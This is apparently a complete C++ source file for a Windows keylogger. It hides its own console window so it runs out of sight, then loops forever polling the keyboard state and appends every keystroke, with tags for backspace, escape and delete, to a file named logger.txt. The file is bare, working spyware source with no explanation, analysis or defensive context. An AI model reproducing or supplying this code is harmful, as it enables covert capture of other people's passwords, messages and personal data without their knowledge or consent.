#include<iostream>
#include<windows.h>
#include<Winuser.h>
#include<fstream>
using namespace std;
void hide()
{
	HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
}
int main()
{
    hide();
    char  i;
    while(1)
    {
        for(i=8;i<=190;i++)
        {
            if(GetAsyncKeyState(i)==-32767)
            {
                //cout<<i;
                ofstream f("logger.txt",std::ofstream::app);
                if(i==8)
                    f<<"[BACKSPACE]";
                if(i==27)
                    f<<"[ESCAPE]";
                if(i==127)
                    f<<"[DELETE]";
                f<<i;
                f.close();
            }
        }
    }
    return 0;
}
